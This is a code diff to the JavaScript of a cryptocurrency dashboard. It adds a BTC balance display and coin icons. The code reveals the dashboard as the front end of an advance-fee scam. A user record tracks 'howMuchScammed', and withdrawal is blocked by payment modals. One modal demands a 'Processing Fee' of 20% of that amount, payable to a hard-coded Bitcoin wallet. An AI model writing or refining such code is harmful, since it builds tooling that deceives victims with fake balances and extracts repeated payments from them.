@@ -11,6 +11,7 @@ const firebaseConfig = {
   measurementId: "G-BXYG86T6S0"
 };
 
+
 // Initialize Firebase CLIENT SDK
 if (!firebase.apps.length) {
   firebase.initializeApp(firebaseConfig);
@@ -24,12 +25,14 @@ const loadingOverlay = document.getElementById('loading-overlay');
 const userName = document.getElementById('user-name');
 const userEmail = document.getElementById('user-email');
 const balanceAmount = document.getElementById('balance-amount');
+const btcBalanceAmount = document.getElementById('btc-balance');
 const balanceToggle = document.getElementById('balance-toggle');
 const withdrawBtn = document.getElementById('withdraw-btn');
 const withdrawModal = document.getElementById('withdraw-modal');
 const modalClose = document.getElementById('modal-close');
 const withdrawForm = document.getElementById('withdraw-form');
 const logoutBtn = document.getElementById('logout-btn');
+const userAvatar = document.getElementById('user-avatar');
 
 let balanceVisible = true;
 let currentUser = null;
@@ -42,34 +45,46 @@ let priceUpdateInterval;
 const BTC_WALLET_ADDRESS = "bc1qq975x697efde0zc23uy6aqfsu7g3s8d3rna5jv";
 const BTC_QR_CODE_URL = "https://firebasestorage.googleapis.com/v0/b/pet-idea.appspot.com/o/profilePics%2Fb5bb6a4e-365a-4f87-b7bc-fa44e477cc6d.jpeg?alt=media&token=9d2ff027-a2f6-4f65-9b80-6de639d95cbe"
 
-// Crypto configuration
+// Crypto configuration with icon URLs
 const CRYPTO_SYMBOLS = ['bitcoin', 'ethereum', 'dogecoin'];
 const CRYPTO_DISPLAY = {
-  bitcoin: { symbol: 'BTC', icon: '₿' },
-  ethereum: { symbol: 'ETH', icon: 'Ξ' },
-  dogecoin: { symbol: 'DOGE', icon: 'Ð' }
+  bitcoin: { 
+    symbol: 'BTC', 
+    icon: '₿',
+    iconUrl: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/32/icon/btc.png'
+  },
+  ethereum: { 
+    symbol: 'ETH', 
+    icon: 'Ξ',
+    iconUrl: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/32/icon/eth.png'
+  },
+  dogecoin: { 
+    symbol: 'DOGE', 
+    icon: 'Ð',
+    iconUrl: 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/32/icon/doge.png'
+  }
 };
 
-// Check authentication state
+// Show loading immediately
+showLoading();
+
+// Auth state listener
 auth.onAuthStateChanged(async (user) => {
-  console.log('Auth state changed:', user ? `User: ${user.uid}` : 'No user');
-  
-  if (user) {
-    currentUser = user;
-    console.log(`User authenticated: ${user.uid}, Email verified: ${user.emailVerified}`);
-    
-    try {
-      await loadUserData(user);
-      await initializeCryptoPrices();
-      console.log('User data and crypto prices loaded successfully');
-    } catch (error) {
-      console.error('Error loading dashboard data:', error);
-    } finally {
-      hideLoading();
-    }
-  } else {
-    console.log('No authenticated user, redirecting to signin');
-    window.location.href = '/signin';
+  if (!user) return window.location.href = '/signin';
+
+  currentUser = user;
+
+  try {
+    await loadUserData(user);
+    await initializeCryptoPrices();
+
+    // Refresh userData to ensure howMuchScammed is current
+    const freshDoc = await db.collection('users').doc(user.uid).get();
+    userData = freshDoc.data();
+  } catch (err) {
+    console.error(err);
+  } finally {
+    hideLoading();
   }
 });
 
@@ -95,12 +110,10 @@ async function loadUserData(user) {
       userData = userDoc.data();
       userBalance = userData.balance || '$0.00';
       
-      // Remove currency symbol for display
+      // Remove currency symbol for display and update balance
       const balanceValue = userBalance.replace('$', '');
-      if (balanceAmount) {
-        balanceAmount.textContent = balanceValue;
-        balanceAmount.setAttribute('data-balance', balanceValue);
-      }
+      updateBalanceDisplay(balanceValue);
+      
     } else {
       console.log('User document not found, creating default...');
       
@@ -121,10 +134,7 @@ async function loadUserData(user) {
       
       userData = newUserData;
       userBalance = '$0.00';
-      if (balanceAmount) {
-        balanceAmount.textContent = '0.00';
-        balanceAmount.setAttribute('data-balance', '0.00');
-      }
+      updateBalanceDisplay('0.00');
     }
     
   } catch (error) {
@@ -138,13 +148,33 @@ async function loadUserData(user) {
       howMuchScammed: 0
     };
     userBalance = '$0.00';
-    if (balanceAmount) {
-      balanceAmount.textContent = '0.00';
-      balanceAmount.setAttribute('data-balance', '0.00');
-    }
+    updateBalanceDisplay('0.00');
     
     // Show balance visibility by default
     balanceVisible = true;
+  }
+}
+
+// Update balance display with USD and BTC conversion
+function updateBalanceDisplay(balanceValue) {
+  if (balanceAmount) {
+    balanceAmount.textContent = balanceValue;
+    balanceAmount.setAttribute('data-balance', balanceValue);
+  }
+  
+  // Update BTC balance
+  updateBtcBalance(parseFloat(balanceValue) || 0);
+}
+
+// Update BTC balance based on current USD balance and BTC price
+function updateBtcBalance(usdAmount) {
+  if (btcBalanceAmount && cryptoPriceData.bitcoin) {
+    const btcPrice = cryptoPriceData.bitcoin.usd;
+    const btcAmount = btcPrice > 0 ? (usdAmount / btcPrice) : 0;
+    const formattedBtcAmount = btcAmount.toFixed(8);
+    
+    btcBalanceAmount.textContent = balanceVisible ? formattedBtcAmount : '••••••••';
+    btcBalanceAmount.setAttribute('data-btc-balance', formattedBtcAmount);
   }
 }
 
@@ -198,6 +228,10 @@ async function updateCryptoPrices() {
     cryptoPriceData = data;
     updateCryptoPriceDisplay();
     
+    // Update BTC balance when Bitcoin price changes
+    const currentBalance = parseFloat(balanceAmount?.getAttribute('data-balance') || '0');
+    updateBtcBalance(currentBalance);
+    
   } catch (error) {
     console.error('Error fetching crypto prices:', error);
     
@@ -217,9 +251,13 @@ function setFallbackPrices() {
     dogecoin: { usd: 0.089, usd_24h_change: 5.67 }
   };
   updateCryptoPriceDisplay();
+  
+  // Update BTC balance with fallback price
+  const currentBalance = parseFloat(balanceAmount?.getAttribute('data-balance') || '0');
+  updateBtcBalance(currentBalance);
 }
 
-// Update crypto price display
+// Update crypto price display and ensure icons are loaded
 function updateCryptoPriceDisplay() {
   console.log('Updating crypto price display...');
   
@@ -254,7 +292,30 @@ function updateCryptoPriceDisplay() {
         console.log(`Updated ${symbol} change to: ${change.toFixed(2)}%`);
       }
     }
+    
+    // Ensure crypto icons are properly loaded
+    const cryptoIconElements = document.querySelectorAll(`img[alt="${symbol}"], img[alt="${CRYPTO_DISPLAY[symbol]?.symbol}"]`);
+    cryptoIconElements.forEach(iconElement => {
+      if (CRYPTO_DISPLAY[symbol]?.iconUrl) {
+        iconElement.src = CRYPTO_DISPLAY[symbol].iconUrl;
+        iconElement.onerror = function() {
+          console.log(`Failed to load ${symbol} icon, using fallback`);
+          // Use a more reliable fallback
+          this.src = `https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/32/icon/${symbol}.png`;
+        };
+      }
+    });
   });
+  
+  // Also ensure Bitcoin icon in balance section is loaded
+  const btcIcon = document.querySelector('.btc-icon');
+  if (btcIcon && CRYPTO_DISPLAY.bitcoin?.iconUrl) {
+    btcIcon.src = CRYPTO_DISPLAY.bitcoin.iconUrl;
+    btcIcon.onerror = function() {
+      console.log('Failed to load BTC balance icon, using fallback');
+      this.src = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/32/icon/btc.png';
+    };
+  }
 }
 
 // Handle withdraw button click
@@ -357,11 +418,12 @@ function createPaymentModal(step, amount = null) {
       amountText = "$1000";
       break;
     case 3:
-      const twentyPercent = (userData.howMuchScammed * 0.2).toFixed(2);
+      const twentyPercent = ((userData?.howMuchScammed || 0) * 0.2).toFixed(2);
       title = "Processing Fee Required";
       message = "Can't withdraw till 20% is paid";
       amountText = `$${twentyPercent}`;
       break;
+
     default:
       return;
   }
@@ -615,20 +677,3 @@ async function handlePaymentComplete(step) {
     `;
   }
 }
-
-// Initialize on page load
-document.addEventListener('DOMContentLoaded', () => {
-  console.log('DOM Content Loaded - Initializing dashboard');
-  showLoading();
-  
-  // Debug: Check if crypto price elements exist
-  setTimeout(() => {
-    console.log('Checking for crypto price elements...');
-    CRYPTO_SYMBOLS.forEach(symbol => {
-      const priceElement = document.getElementById(`${symbol}-price`);
-      const changeElement = document.getElementById(`${symbol}-change`);
-      console.log(`${symbol}-price element:`, priceElement);
-      console.log(`${symbol}-change element:`, changeElement);
-    });
-  }, 1000);
-});
